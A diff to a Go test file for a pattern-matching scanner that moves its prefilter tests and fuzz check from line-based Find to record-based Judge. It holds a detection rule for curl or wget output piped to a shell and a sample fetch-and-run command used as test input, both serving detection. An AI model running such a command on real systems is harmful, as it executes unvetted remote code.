@@ -109,25 +109,27 @@ func TestPrefilterKeepsTheStrongShapes(t *testing.T) {
 	}
 }
 
-// TestPrefilterOnAMatchingLine is the end-to-end face of the same rule: the
-// spans a rule reports are unchanged by the prefilter, on a line that matches
+// TestPrefilterOnAMatchingRecord is the end-to-end face of the same rule: the
+// spans a rule reports are unchanged by the prefilter, on a value that matches
 // and on one that does not.
-func TestPrefilterOnAMatchingLine(t *testing.T) {
+func TestPrefilterOnAMatchingRecord(t *testing.T) {
 	rule := NewRule("test", `\b(?:curl|wget)\b[^|\n]*\|\s*(?:ba|da|z|k)?sh\b`, Critical, "piped to a shell")
 	line := "curl -s http://example.test/x.sh | sh"
-	start, end, ok := rule.Find(line)
-	if !ok || line[start:end] == "" {
-		t.Fatalf("the prefilter rejected a matching line: %q", line)
+	rec := TextRecord(line)
+	matches := rule.Judge(&rec)
+	if len(matches) != 1 || len(matches[0].Spans) != 1 || matches[0].Spans[0].End <= matches[0].Spans[0].Start {
+		t.Fatalf("the prefilter rejected a matching value: %q", line)
 	}
-	if _, _, ok := rule.Find("-rw-r--r-- 1 root root 10 Mar 15 10:20 keep.log"); ok {
-		t.Fatal("a line with no candidate literal should not match")
+	quiet := TextRecord("-rw-r--r-- 1 root root 10 Mar 15 10:20 keep.log")
+	if matches := rule.Judge(&quiet); matches != nil {
+		t.Fatal("a value with no candidate literal should not match")
 	}
 }
 
 // FuzzRulePrefilter is the differential check on the same obligation with
 // patterns the tables above never thought of: whatever the engine finds, the
-// prefiltered Find must find as well. A literal the analysis wrongly requires
-// shows up here as a missed span.
+// prefiltered judgment must find as well. A literal the analysis wrongly
+// requires shows up here as a missed span.
 func FuzzRulePrefilter(f *testing.F) {
 	for _, source := range prefilterPatterns {
 		f.Add(source, "curl -s http://example.test/x.sh | sh")
@@ -141,23 +143,27 @@ func FuzzRulePrefilter(f *testing.F) {
 			ID: "fuzz", Pattern: compiled, Severity: Critical, Message: "fuzz",
 			literals: prefilter(source),
 		}
-		gotStart, gotEnd, gotOK := rule.Find(line)
-		wantStart, wantEnd, wantOK := findWithoutPrefilter(rule, line)
-		if gotStart != wantStart || gotEnd != wantEnd || gotOK != wantOK {
-			t.Fatalf("prefilter changed the verdict for %q on %q: got (%d,%d,%v), want (%d,%d,%v)",
-				source, line, gotStart, gotEnd, gotOK, wantStart, wantEnd, wantOK)
+		rec := TextRecord(line)
+		got := rule.Judge(&rec)
+		want := judgeWithoutPrefilter(rule, &rec)
+		if len(got) != len(want) {
+			t.Fatalf("prefilter changed the verdict for %q on %q: got %+v, want %+v",
+				source, line, got, want)
+		}
+		for index := range got {
+			if got[index].Spans[0] != want[index].Spans[0] {
+				t.Fatalf("prefilter changed the span for %q on %q: got %+v, want %+v",
+					source, line, got[index].Spans[0], want[index].Spans[0])
+			}
 		}
 	})
 }
 
-// findWithoutPrefilter is Rule.Find with the prefilter left out: the reference
-// the fuzz compares against.
-func findWithoutPrefilter(r Rule, line string) (int, int, bool) {
-	loc := r.Pattern.FindStringIndex(line)
-	if loc == nil || (r.Exclude != nil && r.Exclude.MatchString(line)) {
-		return 0, 0, false
-	}
-	return loc[0], loc[1], true
+// judgeWithoutPrefilter is Rule.Judge with the prefilter left out: the
+// reference the fuzz compares against.
+func judgeWithoutPrefilter(r Rule, rec *Record) []Match {
+	r.literals = nil
+	return r.Judge(rec)
 }
 
 // candidateTexts is every string over the alphabet up to maxLen, joined — a
